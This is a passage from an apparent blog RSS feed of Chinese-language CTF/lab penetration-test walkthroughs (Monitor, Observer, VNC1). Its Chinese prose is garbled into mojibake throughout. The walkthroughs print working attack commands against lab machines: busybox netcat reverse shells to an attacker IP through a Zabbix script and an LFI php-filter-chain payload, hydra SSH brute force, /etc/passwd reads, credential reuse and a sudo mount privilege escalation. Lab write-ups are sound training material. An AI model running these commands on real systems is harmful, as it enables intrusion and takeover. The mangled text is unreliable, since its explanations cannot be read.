Áé∞Âú®Êã•Êúâ‰∫ÜrootÊùÉÈôêÔºåÂèØ‰ª•ËØªÂèñÊâÄÊúâÁöÑFlag„ÄÇ

```bash
bash-5.0# cat /root/root.txt
flag{root-5de923e57adefd6a1fd53a6705ad6486}

bash-5.0# cat /home/welcome/user.txt
flag{user-73b671a5f913d849d405784a428288dd}
```

ÊâÄÊúâFlagÂùáÂ∑≤ÊâæÂà∞ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_hoshi.html</guid><pubDate>Sun, 10 Aug 2025 15:19:48 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Monitor</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Monitor.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºå‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.141 08:00:27:b0:33:ee       PCS Systemtechnik GmbH
...
```

Á°ÆËÆ§ÁõÆÊ†á‰∏ªÊú∫IPÂú∞ÂùÄ‰∏∫ `192.168.205.141`„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÂíåÊúçÂä°ÁâàÊú¨Êé¢Êµã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.141
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
10050/tcp open  zabbix-agent
10051/tcp open  zabbix-trapper
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÂºÄÊîæ‰∫ÜÂ§ö‰∏™Á´ØÂè£ÔºåÂåÖÊã¨ **22 (SSH)**, **80 (HTTP)**, ‰ª•Âèä‰∏éZabbixÁõëÊéßÊúçÂä°Áõ∏ÂÖ≥ÁöÑ **10050** Âíå **10051** Á´ØÂè£„ÄÇ

# ‰∫å„ÄÅWebÊ∏óÈÄè‰∏éÁ´ãË∂≥ÁÇπ

## 1. WebÊúçÂä°Êé¢Êü•

ËÆøÈóÆÁõÆÊ†á `http://192.168.205.141`ÔºåÈ°µÈù¢ÊòæÁ§∫‰∏∫‰∏Ä‰∏™‚ÄúÁõëÊéßÁ≥ªÁªüÁôªÂΩï‚ÄùÁïåÈù¢„ÄÇÂ∞ùËØï‰ΩøÁî®Â∏∏ËßÅÁöÑÂº±Âè£‰ª§ `admin:admin` ËøõË°åÁôªÂΩïÔºåËØ∑Ê±ÇÊàêÂäüÂêéË¢´ÈáçÂÆöÂêëÂà∞ `dashboard.php`ÔºåÁôªÂΩïÂêéËøõÂÖ•‰∏Ä‰∏™ÈÄöÁî®ÁöÑ‰ª™Ë°®ÊùøÈ°µÈù¢ÔºåÊú™ÂèëÁé∞ÂèØÂà©Áî®ÁöÑÂäüËÉΩÁÇπÊàñ‰ø°ÊÅØÊ≥ÑÈú≤„ÄÇ

ÈöèÂêéÔºå‰ΩøÁî®`gobuster`ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÈáçË¶ÅÁöÑË∑ØÂæÑ `/zabbix/`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.141 ...
...
/zabbix (Status: 301) [Size: 319] [--&gt; http://192.168.205.141/zabbix/]
...
```

## 2. Zabbix RCE (ËøúÁ®ã‰ª£Á†ÅÊâßË°å)

ÈíàÂØπÂèëÁé∞ÁöÑ `/zabbix` Ë∑ØÂæÑÔºå‰ΩøÁî®`nuclei`ËøõË°åÊºèÊ¥ûÊâ´ÊèèÔºåÂèëÁé∞Â≠òÂú®ZabbixÈªòËÆ§Âá≠ËØÅÊºèÊ¥û„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nuclei -u http://192.168.205.141/zabbix/
...
[zabbix-default-login] [http] [high] http://192.168.205.141/zabbix/index.php [password='zabbix',path='/index.php',username='Admin']
...
```

Êâ´ÊèèÁªìÊûúÊèêÁ§∫ÈªòËÆ§Áî®Êà∑Âêç‰∏∫ `Admin`ÔºåÂØÜÁ†Å‰∏∫ `zabbix`„ÄÇ

‰ΩøÁî®ËØ•Âá≠ËØÅÁôªÂΩïZabbixÁ≥ªÁªü„ÄÇZabbixÊèê‰æõ‰∫ÜÂàõÂª∫ÂíåÊâßË°åËÑöÊú¨ÁöÑÂäüËÉΩÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ê≠§ÂäüËÉΩËé∑ÂèñÂèçÂºπshell„ÄÇ

1. **ÂàõÂª∫ËÑöÊú¨**: ÂØºËà™Âà∞ `Administration` &gt; `Scripts`ÔºåÁÇπÂáª `Create script`„ÄÇ

2. **ÈÖçÁΩÆËÑöÊú¨**:

   *   **Name**: `shell`
   *   **Scope**:`Manual host action`
   *   **Type**:`Script`
   *   **Execute on**:`Zabbix server`
   *   **Commands**: `busybox nc 192.168.205.128 8888 -e /bin/bash`

   *ps:Âª∫ËÆÆËøõÂéªshell‰πãÂêéÂÜô‰∏Ä‰∏™ËÑöÊú¨ÂÜçÊâßË°å‰∏ÄÈÅçÂèçÂºπÔºå‰∏çÁÑ∂ÁöÑËØùÔºå‰ªñÁöÑËÑöÊú¨‰ªªÂä°‰∏ÄÁªìÊùüÂ∞±‰ºöÊñ≠ÂºÄÔºåÂ§ßÁ∫¶5minÂ∑¶Âè≥*

3. **ÊâßË°åËÑöÊú¨**: ÂØºËà™Âà∞ `Monitoring` &gt; `Hosts`ÔºåÈÄâÊã©ÁõÆÊ†á‰∏ªÊú∫ÔºåÁÑ∂Âêé‰ªéËÑöÊú¨‰∏ãÊãâËèúÂçï‰∏≠ÈÄâÊã©Âπ∂ÊâßË°åÂàöÂàöÂàõÂª∫ÁöÑ `shell` ËÑöÊú¨„ÄÇ

![image-20250810205337566](http://7r1UMPHK.github.io/image/20250810205337820.webp)

Âú®Kali‰∏äËÆæÁΩÆ`netcat`ÁõëÂê¨ÔºåÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπshell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.141] 55914
id
uid=107(zabbix) gid=114(zabbix) groups=114(zabbix)
```

‰∏∫Êñπ‰æøÂêéÁª≠Êìç‰ΩúÔºåÂØπËé∑ÂèñÁöÑÈùû‰∫§‰∫íÂºèshellËøõË°åÁ®≥ÂÆöÂåñÂ§ÑÁêÜ„ÄÇ

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
```

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. Ê®™ÂêëÁßªÂä® (zabbix -&gt; hyh)

Âú®`zabbix`Áî®Êà∑ÊùÉÈôê‰∏ãÔºåÂØªÊâæÈÖçÁΩÆÊñá‰ª∂‰ª•Ëé∑ÂèñÊõ¥Â§öÂá≠ËØÅ‰ø°ÊÅØ„ÄÇZabbixÁöÑWebÈÖçÁΩÆÊñá‰ª∂ÈÄöÂ∏∏ÂåÖÂê´‰∫ÜÊï∞ÊçÆÂ∫ìÁöÑËøûÊé•‰ø°ÊÅØ„ÄÇ

```bash
zabbix@Monitor:/$ find / -name 'zabbix.conf.php' 2&gt;/dev/null
/usr/share/zabbix/conf/zabbix.conf.php
zabbix@Monitor:/$ cat /usr/share/zabbix/conf/zabbix.conf.php
&lt;?php
// Zabbix GUI configuration file.
$DB['TYPE']                             = 'MYSQL';
$DB['SERVER']                   = 'localhost';
$DB['DATABASE']                 = 'zabbix';
$DB['USER']                             = 'zabbix';
$DB['PASSWORD']                 = 'root123';
...
?&gt;
```

‰ªéÈÖçÁΩÆÊñá‰ª∂‰∏≠ÔºåÊàë‰ª¨Ëé∑Âæó‰∫ÜÊï∞ÊçÆÂ∫ìÁî®Êà∑`zabbix`ÁöÑÂØÜÁ†Å`root123`„ÄÇÈÄöËøá`ls /home`ÂèëÁé∞Â≠òÂú®Âè¶‰∏Ä‰∏™Áî®Êà∑`hyh`„ÄÇÂ∞ùËØï‰ΩøÁî®Ê≠§ÂØÜÁ†ÅÂàáÊç¢Âà∞`hyh`Áî®Êà∑„ÄÇ

```bash
zabbix@Monitor:/$ su hyh
Password: root123
hyh@Monitor:~$ id
uid=1002(hyh) gid=1002(hyh) groups=1002(hyh)
```

ÊàêÂäüÂàáÊç¢Âà∞`hyh`Áî®Êà∑ÔºåÂπ∂Âú®ÂÖ∂ÂÆ∂ÁõÆÂΩï‰∏ãÊâæÂà∞`user.txt`„ÄÇ

## 2. ÊèêÊùÉËá≥root

Âú®`hyh`Áî®Êà∑‰∏ãÔºå‰ΩøÁî®`sudo -l`Ê£ÄÊü•ÂÖ∂sudoÊùÉÈôê„ÄÇ

```bash
hyh@Monitor:~$ sudo -l
...
User hyh may run the following commands on Monitor:
    (ALL) NOPASSWD: /usr/bin/mount
```

ÁªìÊûúÊòæÁ§∫Ôºå`hyh`Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°å`/usr/bin/mount`ÂëΩ‰ª§„ÄÇÊü•ËØ¢**GTFOBins**ÂèØÁü•ÔºåÂèØ‰ª•Âà©Áî®`mount`ÁöÑ`bind`ÈÄâÈ°πÊù•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇ

&gt;https://gtfobins.github.io/gtfobins/mount/

Êàë‰ª¨Â∞Ü`/bin/bash`ÈÄöËøá`bind`ÁöÑÊñπÂºèÊåÇËΩΩÂà∞`/bin/mount`‰∏äÔºåÁÑ∂ÂêéÈÄöËøá`sudo`ÊâßË°å`mount`ÔºåÊ≠§Êó∂ÊâßË°åÁöÑÂ∞ÜÊòØÊã•ÊúârootÊùÉÈôêÁöÑbash„ÄÇ

```bash
hyh@Monitor:~$ sudo mount -o bind /bin/bash /bin/mount
hyh@Monitor:~$ sudo mount
root@Monitor:/home/hyh# id
uid=0(root) gid=0(root) groups=0(root)
```

ÊàêÂäüËé∑ÂæórootÊùÉÈôê„ÄÇ

# Âõõ„ÄÅËé∑ÂèñFlag

Áé∞Âú®Êàë‰ª¨Êã•Êúâ‰∫ÜrootÊùÉÈôêÔºåÂèØ‰ª•ËØªÂèñÊâÄÊúâÁöÑFlag„ÄÇ

```bash
root@Monitor:~# cat /root/root.txt
flag{root-deb15d884e04de6f6972b3c25e3cc11b}

root@Monitor:~# cat /home/hyh/user.txt 
flag{user-ab0e0561b1a833a6141ad2273744543c}
```

ÊâÄÊúâFlagÂùáÂ∑≤ÊâæÂà∞ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Monitor.html</guid><pubDate>Sun, 10 Aug 2025 15:19:32 +0000</pubDate></item><item><title>vulnyx_Observer</title><link>https://7r1UMPHK.github.io/post/vulnyx_Observer.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºå‰ΩøÁî®`arp-scan`Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.131 08:00:27:e7:c9:11       PCS Systemtechnik GmbH
...
```

Á°ÆËÆ§ÁõÆÊ†á‰∏ªÊú∫IPÂú∞ÂùÄ‰∏∫ `192.168.205.131`„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÂíåÊúçÂä°ÁâàÊú¨Êé¢Êµã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- -A 192.168.205.131           
Starting Nmap 7.95 ( https://nmap.org )
...
Nmap scan report for 192.168.205.131
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:E7:C9:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** ‰∏§‰∏™Á´ØÂè£„ÄÇ

# ‰∫å„ÄÅWebÊ∏óÈÄè

## 1. ËôöÊãü‰∏ªÊú∫ÂèëÁé∞

Áõ¥Êé•ËÆøÈóÆ `http://192.168.205.131` ÊòæÁ§∫ÁöÑÊòØ Apache ÁöÑÈªòËÆ§È°µÈù¢„ÄÇÈÄöËøáÁõÆÂΩïÁàÜÁ†¥ÂèØ‰ª•Ëé∑Âæó‰∏Ä‰∫õÁõÆÂΩï‰ø°ÊÅØ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64  
...
/index.html           (Status: 200) [Size: 35742]
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.131/images/]
/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.131/css/]
/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.131/js/]
/fonts                (Status: 301) [Size: 318] [--&gt; http://192.168.205.131/fonts/]
...
```

ÈÄöËøáÊü•Áúã`/image`‰∏≠ÁöÑÂõæÁâáÊñá‰ª∂ÔºåÂèØ‰ª•ÂèëÁé∞Ôºå‰ªñ‰ΩøÁî®ÁöÑÂõæÁâáÂÜÖÂÆπË≤å‰ººÊòØwebÁΩëÁ´ôÊ®°ÊùøÁöÑÂõæÁâáÔºåÊâÄ‰ª•ÁåúÊµãÂèØËÉΩÂ≠òÂú®ÂüüÂêç„ÄÇÂ∞ÜÂüüÂêç `Observer.nlx` ÁªëÂÆöÂà∞IP„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo vim /etc/hosts

# Âú®Êñá‰ª∂Êú´Â∞æÊ∑ªÂä†
192.168.205.131 Observer.nlx
```

## 2. Web‰ø°ÊÅØÊûö‰∏æ

ËÆøÈóÆ `http://Observer.nlx`ÔºåÁΩëÁ´ôÊòØ‰∏Ä‰∏™ÈùôÊÄÅÁöÑÁΩëÈ°µÊ®°Êùø„ÄÇÂú®ÂØπÁΩëÁ´ôÁõÆÂΩïËøõË°åÁàÜÁ†¥ÂêéÊú™ÂèëÁé∞ÊïèÊÑüÊñá‰ª∂Ôºå‰ΩÜÂú®‰∏ªÈ°µ`index.html`ÁöÑÊ∫êÁ†Å‰∏≠Ôºå‚ÄúOur Team‚ÄùÈÉ®ÂàÜÂèëÁé∞‰∫ÜÂá†‰∏™ÂèØÁñëÁöÑÁî®Êà∑Âêç„ÄÇ


![image-20250810130421280](http://7r1UMPHK.github.io/image/20250810130421538.webp)

‰ªéÊ∫êÁ†Å‰∏≠ÔºåÊàë‰ª¨ÊèêÂèñÂà∞‰ª•‰∏ãÊΩúÂú®Áî®Êà∑ÂêçÔºö
*   **john**
*   **mike**
*   **remo**
*   **niscal**

# ‰∏â„ÄÅ‰∏ªÊú∫Ê∏óÈÄè‰∏éÁ´ãË∂≥ÁÇπ

## 1. SSHÁàÜÁ†¥

Âà©Áî®‰∏ä‰∏ÄÊ≠•ÂèëÁé∞ÁöÑÁî®Êà∑ÂêçÂàóË°®ÔºåÁªìÂêàÂº±Âè£‰ª§Â≠óÂÖ∏ÔºåÂØπSSHÊúçÂä°ËøõË°åÁàÜÁ†¥ÊîªÂáª„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cat user.txt
john
mike
remo
niscal

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ hydra -L user.txt -P /path/to/passwords.txt ssh://192.168.205.131 -t 64
...
[22][ssh] host: 192.168.205.131   login: niscal   password: niscal
...
```

ÊàêÂäüÁàÜÁ†¥Âá∫Áî®Êà∑ `niscal` ÁöÑÂØÜÁ†Å‰∏∫ `niscal`„ÄÇ

## 2. ÂèóÈôêShellÁªïËøá

Â∞ùËØï‰ΩøÁî®Ëé∑ÂèñÁöÑÂá≠ËØÅÁôªÂΩïSSH„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh niscal@192.168.205.131
niscal@192.168.205.131's password: 

########################################
# Dear person,                         #
# Not now! I'm busy with the terminal. #
# by Niscal                            #
########################################

Connection to 192.168.205.131 closed.
```

ÁôªÂΩïÂêéËøûÊé•Á´ãÂç≥Ë¢´ÂÖ≥Èó≠ÔºåÂπ∂ÊòæÁ§∫‰∏ÄÊù°ÂÖ≥ÈîÆ‰ø°ÊÅØ **'I'm busy with the terminal.'**„ÄÇËøôÂº∫ÁÉàÊöóÁ§∫ÂΩìÂâçÁôªÂΩïÁöÑ‰ºöËØù‰∏çË¢´ËÆ§‰∏∫ÊòØ‚ÄúÁúüÊ≠£ÁöÑÁªàÁ´Ø‚ÄùÔºåÂõ†Ê≠§Ë¢´ÈôêÂà∂ËÑöÊú¨ÊãíÁªù„ÄÇ

## 3. X11ËΩ¨ÂèëÊîªÂáª

Ê†πÊçÆÊèêÁ§∫ÔºåÊàë‰ª¨Â∞ùËØï‰ΩøÁî®SSHÁöÑX11ËΩ¨ÂèëÂäüËÉΩ (`-X` Êàñ `-Y`) Êù•ËØ∑Ê±Ç‰∏Ä‰∏™ÂõæÂΩ¢Âåñ‰ºöËØùÔºåËøôÂæàÂèØËÉΩÁªïËøáÈôêÂà∂ËÑöÊú¨„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ssh -X niscal@192.168.205.131 
niscal@192.168.205.131's password: 
...
```

![image-20250810125226283](http://7r1UMPHK.github.io/image/20250810125233587.webp)

ÊàêÂäüÊòæÁ§∫ÔºåÂπ∂‰∏îÊòæÁ§∫‰∫Ü‰∏ãÈù¢ÂÜÖÂÆπ„ÄÇ

```
niscal@observer:~$ echo -n REMOisGOD | passwd remo
```

ÁªèËøáÂ∞ùËØïËØ•X11 shellÂú®ËæìÂÖ•ÂëΩ‰ª§ÂõûËΩ¶Â∞±‰ºöÊñ≠ÂºÄ„ÄÇ

# Âõõ„ÄÅÊùÉÈôêÊèêÂçá

## 1. Ê®™ÂêëÁßªÂä® (niscal -&gt; remo)

‰ΩøÁî®ÊòæÁ§∫ÁöÑÁî®Êà∑Âêç`remo`ÂíåÂØÜÁ†Å`REMOisGOD`ËøõË°åÁôªÂΩï„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh remo@192.168.205.131
remo@192.168.205.131's password: 
...
remo@observer:~$ id
uid=1001(remo) gid=1001(remo) groups=1001(remo)
```

ÊàêÂäüÂàáÊç¢Âà∞ `remo` Áî®Êà∑„ÄÇ

## 2. ÊèêÊùÉËá≥root

Âú® `remo` Áî®Êà∑‰∏ãËøõË°å‰ø°ÊÅØÊî∂ÈõÜÔºåÊ£ÄÊü•ÁéØÂ¢ÉÂèòÈáèÊó∂ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÈáçÂ§ßÁ∫øÁ¥¢„ÄÇ

```bash
remo@observer:~$ env
...
rootKEY=LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K... (Ê≠§Â§ÑÁúÅÁï•‰∫ÜË∂ÖÈïøÁöÑBase64Â≠óÁ¨¶‰∏≤)
...
```

ÁéØÂ¢ÉÂèòÈáè `rootKEY` ÂåÖÂê´‰∏Ä‰∏™Base64ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÁúãËµ∑Êù•ÂÉèÊòØ‰∏Ä‰∏™SSHÁßÅÈí•„ÄÇÊàë‰ª¨Â∞ÜÂÖ∂Ëß£Á†ÅÂπ∂‰øùÂ≠ò„ÄÇ

```bash
remo@observer:~$ echo 'LS0tLS1...LS0tCg==' | base64 -d &gt; id_rsa
remo@observer:~$ chmod 600 id_rsa
```

‰ΩøÁî®Ëøô‰∏™ÁßÅÈí•Â∞ùËØï‰ª• `root` Áî®Êà∑Ë∫´‰ªΩÁôªÂΩïÊú¨Âú∞SSHÊúçÂä°„ÄÇ

```bash
remo@observer:~$ ssh root@127.0.0.1 -i id_rsa
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
root@observer:~# id
uid=0(root) gid=0(root) groups=0(root)
```

ÊàêÂäüÊèêÊùÉËá≥ `root` Áî®Êà∑ÔºÅ

# ‰∫î„ÄÅËé∑ÂèñFlag

Áé∞Âú®Êàë‰ª¨Êã•Êúâ‰∫ÜÊâÄÊúâÊùÉÈôêÔºåÂèØ‰ª•ËØªÂèñÊâÄÊúâÁöÑFlag„ÄÇ

```bash
root@observer:~# cat /root/root.txt
fa40a17de09827a5ae20a894304c6a49

root@observer:~# cat /home/remo/user.txt 
f2edafebb9851d806ff15deb0477ebe8
```

ÊâÄÊúâFlagÂùáÂ∑≤ÊâæÂà∞ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/vulnyx_Observer.html</guid><pubDate>Sun, 10 Aug 2025 05:15:37 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_VNC1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_VNC1.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè**

È¶ñÂÖàÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫IPÔºåÈöèÂêéÂà©Áî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.140 08:00:27:23:44:a3       PCS Systemtechnik GmbH
...
```

**Á´ØÂè£Êâ´Êèè:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.140
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5901/tcp open  vnc-1
...
```

Êâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.140`ÔºåÂºÄÊîæ‰∫Ü **22 (SSH)**„ÄÅ**80 (HTTP)** Âíå **5901 (VNC)** Á´ØÂè£„ÄÇ

**VNCÊúçÂä°‰æ¶ÂØü:**
ÂØπ5901Á´ØÂè£ËøõË°åËØ¶ÁªÜÁöÑÊúçÂä°Êâ´ÊèèÔºåÁ°ÆËÆ§ÂÖ∂‰∏∫VNCÊúçÂä°ÔºåÂπ∂ÊîØÊåÅÊ†áÂáÜÁöÑÂØÜÁ†ÅËÆ§ËØÅÔºåËøô‰∏∫ÂêéÁª≠ÁöÑÊ®™ÂêëÁßªÂä®Êèê‰æõ‰∫ÜÊΩúÂú®ÁöÑÊîªÂáªÈù¢„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p5901 -sV -sC 192.168.205.140
...
PORT     STATE SERVICE VERSION
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
...
```

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂàùÂßãËÆøÈóÆ**

## **1. WebÊúçÂä°LFIÊºèÊ¥û**

ËÆøÈóÆ80Á´ØÂè£ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™LFIÊºèÊ¥ûÁöÑÊµãËØïÈ°µÈù¢„ÄÇÈÄöËøá `file` ÂèÇÊï∞ÂèØ‰ª•ÂåÖÂê´‰ªªÊÑèÊñá‰ª∂„ÄÇ

**È™åËØÅLFIÊºèÊ¥û:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.140/index.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
todd:x:1000:1000:,,,:/home/todd:/bin/bash
...
```

ÊàêÂäüËØªÂèñ `/etc/passwd` Êñá‰ª∂ÔºåÁ°ÆËÆ§‰∫ÜLFIÊºèÊ¥ûÁöÑÂ≠òÂú®„ÄÇ

## **2. LFI Bypass `disable_functions` RCE**

ÈÄöËøá`php://filter`ËØªÂèñ`phpinfo`ÂèëÁé∞ÔºåÁõÆÊ†áPHPÁéØÂ¢ÉÁ¶ÅÁî®‰∫Ü `system`, `passthru`, `shell_exec` Á≠âÂ∏∏Áî®ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞ÔºåÂØºËá¥‰º†ÁªüÁöÑLFI to RCEÊñπÊ≥ïÂ§±Êïà„ÄÇ

```
disable_functions	system,passthru,shell_exec,proc_open,pcntl_exec,dl
```

ÁÑ∂ËÄåÔºåÊàë‰ª¨ÂèØ‰ª•Êç¢‰∏Ä‰∏™Â∏∏Áî®ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞ÔºåÊúÄÁªàÁªïËøá`disable_functions`ÁöÑÈôêÂà∂Êù•ÊâßË°å‰ª£Á†Å„ÄÇ

Êàë‰ª¨‰ΩøÁî® `php_filter_chain_generator` Â∑•ÂÖ∑Êù•ÁîüÊàêËÉΩÂ§üÊâßË°å `exec($_GET['0']);` ÁöÑPayload„ÄÇ

&gt; https://github.com/synacktiv/php_filter_chain_generator

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
‚îî‚îÄ$ python3 php_filter_chain_generator.py --chain '&lt;?php exec($_GET['0']); ?&gt;'

[+] The following gadget chain will generate the following code : &lt;?php exec($_GET['0']); ?&gt;
php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp
```

## **3. Ëé∑Âèñ www-data Shell**

Â∞ÜÁîüÊàêÁöÑPayloadÈôÑÂä†Âà∞URL‰∏≠ÔºåÂπ∂ÈÄöËøá `0` ÂèÇÊï∞‰º†ÈÄíÂèçÂºπshellÂëΩ‰ª§ÔºåÂú®Êú¨Âú∞ÂºÄÂêØÁõëÂê¨ÔºåÊàêÂäüËé∑Âèñ `www-data` Áî®Êà∑ÁöÑ‰∫§‰∫íÂºèShell„ÄÇ

**Êú¨Âú∞ÁõëÂê¨:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
‚îî‚îÄ$ nc -lvnp 8888
```

**ÊâßË°åPayloadËé∑ÂèñShell:**
(Â∞Ü `[CHAIN]` ÊõøÊç¢‰∏∫‰∏äÈù¢Â∑•ÂÖ∑ÁîüÊàêÁöÑÂÆåÊï¥ËøáÊª§Âô®Èìæ)

```bash
http://192.168.205.140/index.php?file=[CHAIN]&amp;0=busybox nc 192.168.205.128 8888 -e /bin/bash
```

**Ëé∑ÂèñShellÂπ∂Á®≥ÂÆöTTY:**

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.140] 48454
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# ‰ΩøÁî® script Á®≥ÂÆöShell
script /dev/null -c bash
# ‰ΩøÁî® Ctrl+Z Â∞ÜÂÖ∂ÁΩÆ‰∫éÂêéÂè∞ÔºåÁÑ∂Âêé‰ΩøÁî® stty ‰øÆÂ§çÁªàÁ´Ø
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

